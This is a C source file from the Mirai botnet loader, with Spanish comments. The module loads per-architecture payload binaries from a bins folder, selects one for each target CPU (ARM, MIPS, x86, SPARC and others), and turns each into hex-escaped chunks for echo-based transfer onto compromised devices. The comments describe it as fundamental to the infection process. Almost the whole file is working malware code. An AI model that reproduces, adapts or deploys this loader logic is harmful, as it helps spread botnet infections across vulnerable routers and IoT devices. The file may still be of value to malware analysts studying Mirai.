/**************************************************************************
 * Archivo: binary.c
 * 
 * Descripción: Implementación del gestor de binarios para el loader de Mirai.
 * Este módulo se encarga de:
 * - Cargar binarios específicos para diferentes arquitecturas
 * - Convertir binarios a formato hexadecimal para transmisión
 * - Gestionar la lista de binarios disponibles
 * - Proporcionar acceso a binarios según arquitectura objetivo
 * 
 * El código es fundamental para el proceso de infección, ya que maneja
 * la preparación y distribución de payloads específicos por arquitectura.
 **************************************************************************/

/***************************************************************************
 * Inclusión de cabeceras estándar
 ***************************************************************************/
#include <stdio.h>       /* Entrada/salida estándar */
#include <stdlib.h>      /* Funciones de utilidad general y gestión de memoria */
#include <string.h>      /* Manipulación de cadenas */
#include <glob.h>        /* Búsqueda de archivos con patrones */

/***************************************************************************
 * Inclusión de cabeceras del proyecto
 ***************************************************************************/
#include "headers/includes.h"    /* Definiciones comunes del proyecto */
#include "headers/binary.h"      /* Interfaz del gestor de binarios */

/* Variables globales estáticas para la gestión de binarios */
static int bin_list_len = 0;            /* Número de binarios cargados */
static struct binary **bin_list = NULL;  /* Lista de binarios disponibles */

/**
 * Inicializa el sistema de gestión de binarios
 * 
 * Esta función realiza la carga inicial de todos los binarios disponibles:
 * 1. Busca archivos binarios en el directorio bins/
 * 2. Carga cada binario en memoria
 * 3. Identifica la arquitectura de cada binario por su nombre
 * 
 * El proceso de carga incluye:
 * - Búsqueda de archivos con patrón "bins/dlr.*"
 * - Asignación dinámica de memoria para cada binario
 * - Extracción de información de arquitectura del nombre
 * - Conversión del binario a formato hexadecimal
 * 
 * @return TRUE si la inicialización fue exitosa, FALSE en caso contrario
 */
BOOL binary_init(void)
{
    glob_t pglob;                /* Estructura para búsqueda de archivos */
    int i;                       /* Índice para iteración */

    /* Busca todos los binarios disponibles */
    if (glob("bins/dlr.*", GLOB_ERR, NULL, &pglob) != 0)
    {
        printf("¡Error al cargar desde la carpeta bins!\n");
        return;
    }

    /* Procesa cada binario encontrado */
    for (i = 0; i < pglob.gl_pathc; i++)
    {
        char file_name[256];     /* Buffer para nombre de archivo */
        struct binary *bin;      /* Estructura para el binario actual */

        /* Expande la lista de binarios */
        bin_list = realloc(bin_list, (bin_list_len + 1) * sizeof (struct binary *));
        bin_list[bin_list_len] = calloc(1, sizeof (struct binary));
        bin = bin_list[bin_list_len++];

#ifdef DEBUG
        printf("(%d/%d) Cargando %s...\n", i + 1, pglob.gl_pathc, pglob.gl_pathv[i]);
#endif
        /* Extrae la arquitectura del nombre del archivo */
        strcpy(file_name, pglob.gl_pathv[i]);
        strtok(file_name, ".");              /* Descarta la primera parte */
        strcpy(bin->arch, strtok(NULL, ".")); /* Guarda la arquitectura */
        
        /* Carga y procesa el contenido del binario */
        load(bin, pglob.gl_pathv[i]);
    }

    /* Libera recursos de glob */
    globfree(&pglob);
    return TRUE;
}

/**
 * Busca y retorna un binario para una arquitectura específica
 * 
 * Esta función busca en la lista de binarios cargados uno que
 * coincida con la arquitectura solicitada. Es crucial para:
 * - Seleccionar el payload correcto para cada objetivo
 * - Asegurar compatibilidad de binarios
 * - Evitar errores de ejecución por incompatibilidad
 * 
 * Arquitecturas soportadas incluyen:
 * - arm    (ARM 32/64 bits)
 * - mips   (MIPS big endian)
 * - mpsl   (MIPS little endian)
 * - x86    (Intel/AMD 32/64 bits)
 * - spc    (SPARC)
 * - m68k   (Motorola 68k)
 * - ppc    (PowerPC)
 * - sh4    (SuperH)
 * 
 * @param arch  Cadena que identifica la arquitectura objetivo
 * @return      Puntero al binario si se encuentra, NULL si no
 */
struct binary *binary_get_by_arch(char *arch)
{
    int i;

    /* Busca en la lista de binarios */
    for (i = 0; i < bin_list_len; i++)
    {
        /* Compara la arquitectura solicitada con cada binario */
        if (strcmp(arch, bin_list[i]->arch) == 0)
            return bin_list[i];  /* Retorna el binario si coincide */
    }

    return NULL;  /* No se encontró binario para esa arquitectura */
}

/**
 * Carga y procesa un archivo binario
 * 
 * Esta función estática se encarga de:
 * 1. Abrir y leer el archivo binario
 * 2. Convertir el contenido a formato hexadecimal
 * 3. Almacenar el resultado en chunks para transmisión
 * 
 * El proceso de conversión:
 * - Lee el archivo en bloques de tamaño BINARY_BYTES_PER_ECHOLINE
 * - Convierte cada byte a su representación hexadecimal (\xXX)
 * - Almacena los chunks para transmisión posterior
 * 
 * La función es crucial para:
 * - Preparar el payload para transmisión por echo
 * - Asegurar que el binario se puede reconstruir correctamente
 * - Optimizar el uso de memoria y red
 * 
 * @param bin    Estructura del binario a cargar
 * @param fname  Nombre del archivo a procesar
 * @return       TRUE si la carga fue exitosa, FALSE si falló
 */
static BOOL load(struct binary *bin, char *fname)
{
    FILE *file;                              /* Descriptor del archivo */
    char rdbuf[BINARY_BYTES_PER_ECHOLINE];   /* Buffer de lectura */
    int n;                                   /* Bytes leídos */

    /* Intenta abrir el archivo binario */
    if ((file = fopen(fname, "r")) == NULL)
    {
        printf("Error al abrir %s para analisis\n", fname);
        return FALSE;
    }

    /* Lee y procesa el archivo en bloques */
    while ((n = fread(rdbuf, sizeof (char), BINARY_BYTES_PER_ECHOLINE, file)) != 0)
    {
        char *ptr;   /* Puntero al buffer de salida */
        int i;       /* Índice para iteración */

        /* Expande el array de payloads hexadecimales */
        bin->hex_payloads = realloc(bin->hex_payloads, 
                                   (bin->hex_payloads_len + 1) * sizeof (char *));
        /* Asigna espacio para el nuevo chunk (4 chars por byte + overhead) */
        bin->hex_payloads[bin->hex_payloads_len] = calloc(sizeof (char), (4 * n) + 8);
        ptr = bin->hex_payloads[bin->hex_payloads_len++];

        /* Convierte cada byte a su representación hexadecimal */
        for (i = 0; i < n; i++)
            ptr += sprintf(ptr, "\\x%02x", (uint8_t)rdbuf[i]);
    }

    fclose(file);
    return TRUE;  /* Carga exitosa */
}
